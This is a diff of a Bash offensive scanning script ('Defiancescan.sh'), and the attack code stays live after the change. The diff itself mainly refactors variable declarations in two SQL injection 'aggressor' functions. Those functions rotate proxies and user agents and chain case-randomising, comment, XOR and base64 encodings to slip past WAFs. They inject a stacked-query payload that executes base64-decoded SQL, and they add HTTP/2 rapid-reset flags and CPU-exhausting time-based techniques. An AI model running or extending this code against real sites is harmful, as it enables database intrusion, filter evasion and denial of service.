@@ -4,8 +4,10 @@
 
 # Sourced to Defiancescan.sh           
 vector_sqli_agressor_left() {
-  local current_param="${TARGET_PARAM:-id}"
-  local is_raw_post=false
+  local current_param
+current_param="${TARGET_PARAM:-id}"
+  local is_raw_post
+is_raw_post=false
   if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
     is_raw_post=true
   fi
@@ -21,23 +23,20 @@ vector_sqli_agressor_left() {
     local current_time
     current_time=$(date +%H:%M:%S)
 
-    local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
-    local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+    local proxy_flag
+    proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+    local base_ua
+    base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
     local random_ua="$base_ua"
 
     local ua_salt
     ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
     local target_cipher=""
     local target_tls13=""
-    local rapid_reset_args="--http2 --parallel --parallel-max 50"
+    local rapid_reset_args
+    rapid_reset_args="--http2 --parallel --parallel-max 50"
 local chunked_headers
 chunked_headers=(-H "Content-Type: application/x-www-form-urlencoded")
-local payload_length
-payload_length=${#post_data}
-
-if [ "$payload_length" -gt 250 ]; then
-  chunked_headers+=(-H "Transfer-Encoding: chunked")
-fi
 
     if [[ "$base_ua" == *"Firefox"* ]]; then
       random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
@@ -55,16 +54,24 @@ fi
 
     local defiance_tamper_path=""
     local final_query=""
-    local raw_payload="$query_payload"
-    local t2=$(randomcase_engine "$raw_payload")
-    local t4=$(space2comment_engine "$t2")
-    local hex_xor=$(xor_engine "$t4")
-    local b64_payload=$(base64_engine "$hex_xor")
-    local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+    local raw_payload
+    raw_payload="$query_payload"
+    local t2
+    t2=$(randomcase_engine "$raw_payload")
+    local t4
+t4=$(space2comment_engine "$t2")
+    local hex_xor
+hex_xor=$(xor_engine "$t4")
+    local b64_payload
+b64_payload=$(base64_engine "$hex_xor")
+    local defiance_tamper_path
+    defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
-    local waf_args=$(braindamage)
+    local waf_args
+    waf_args=$(braindamage)
     
-    local clean_target_url="$target_url"
+    local clean_target_url
+    clean_target_url="$target_url"
     if [ "$is_raw_post" = false ]; then
       clean_target_url="${target_url%%\?*}"
       if [[ "$clean_target_url" != *"/"* && "$clean_target_url" != *"?"* ]]; then
@@ -79,15 +86,18 @@ fi
       active_payload="$defiance_tamper_path"
     fi
 
-    local current_method="${REQ_METHOD:-POST}"
+    local current_method
+    current_method="${REQ_METHOD:-POST}"
     
-    local join_char="?"
+    local join_char
+    join_char="?"
     if [[ "$target_url" =~ \? ]]; then
       join_char="&"
     fi
     if [[ "$payloadsi" = "true" ]]; then
       if [ "$is_raw_post" = true ] && [ "$current_method" = "POST" ]; then
-        local preview_post=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
+        local preview_post
+        preview_post=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
         output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port]\n      -> Target URL: [${clean_target_url}]\n      -> Param Inject: [\033[1m${current_param}\033[0m]\n      -> Raw Payload: \033[38;5;238m[${preview_post}]\033[0m\n      -> Active Query: \033[38;5;238m[${active_payload}]\033[0m"
       
       elif [ "$current_method" = "POST" ]; then
@@ -97,7 +107,8 @@ fi
         output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port]\n      -> Target URL: [${clean_target_url}]\n      -> Param Inject: [${current_param}]\n      -> Full URL: \033[38;5;238m[${clean_target_url}${join_char}${current_param}=${active_payload}]\033[0m\n      -> Active Query: \033[1;31m[${active_payload}]\033[0m"
       fi
     else
-      local technique_name="Generic Time-Based"
+      local technique_name
+technique_name="Generic Time-Based"
       case "${raw_payload}" in
         *"benchmark"*) technique_name="Stacked Queries Time-Based (Heavy Benchmark)" ;;
         *"randomblob"*) technique_name="Stacked Queries Time-Based (CPU-Exhaustion Blob)" ;;
@@ -120,7 +131,8 @@ fi
         send_to_url="$clean_target_url"
       fi
 
-      local payload_length=${#post_data}
+      local payload_length
+payload_length=${#post_data}
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
       fi                  
@@ -169,8 +181,10 @@ fi
   }
 
 vector_sqli_agressor_right() {
-  local current_param="${TARGET_PARAM:-id}"
-  local is_raw_post=false
+  local current_param
+current_param="${TARGET_PARAM:-id}"
+  local is_raw_post
+is_raw_post=false
   if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
     is_raw_post=true
   fi
@@ -186,24 +200,20 @@ vector_sqli_agressor_right() {
     local current_time
     current_time=$(date +%H:%M:%S)
 
-    local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
-    local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+    local proxy_flag
+proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+    local base_ua
+base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
     local random_ua="$base_ua"
 
     local ua_salt
     ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
     local target_cipher=""
     local target_tls13=""
-    local rapid_reset_args="--http2 --parallel --parallel-max 50"    
+    local rapid_reset_args
+rapid_reset_args="--http2 --parallel --parallel-max 50"    
 local chunked_headers
 chunked_headers=(-H "Content-Type: application/x-www-form-urlencoded")
-
-local payload_length
-payload_length=${#post_data}
-
-if [ "$payload_length" -gt 250 ]; then
-  chunked_headers+=(-H "Transfer-Encoding: chunked")
-fi
 
     if [[ "$base_ua" == *"Firefox"* ]]; then
       random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
@@ -222,13 +232,19 @@ fi
     local defiance_tamper_path=""
     local final_query=""
     local raw_payload="$query_payload"
-    local t2=$(randomcase_engine "$raw_payload")
-    local t4=$(space2comment_engine "$t2")
-    local hex_xor=$(xor_engine "$t4")
-    local b64_payload=$(base64_engine "$hex_xor")
-    local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+    local t2
+t2=$(randomcase_engine "$raw_payload")
+    local t4
+t4=$(space2comment_engine "$t2")
+    local hex_xor
+hex_xor=$(xor_engine "$t4")
+    local b64_payload
+b64_payload=$(base64_engine "$hex_xor")
+    local defiance_tamper_path
+defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
-    local waf_args=$(braindamage)   
+    local waf_args
+waf_args=$(braindamage)   
     local clean_target_url="$target_url"
     if [ "$is_raw_post" = false ]; then
       clean_target_url="${target_url%%\?*}"
@@ -244,9 +260,11 @@ fi
       active_payload="$defiance_tamper_path"
     fi
 
-    local current_method="${REQ_METHOD:-POST}"
+    local current_method
+current_method="${REQ_METHOD:-POST}"
     
-    local join_char="?"
+    local join_char
+join_char="?"
     if [[ "$target_url" =~ \? ]]; then
       join_char="&"
     fi      
@@ -263,7 +281,8 @@ fi
         send_to_url="$clean_target_url"
       fi
 
-      local payload_length=${#post_data}
+      local payload_length
+payload_length=${#post_data}
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
       fi                 
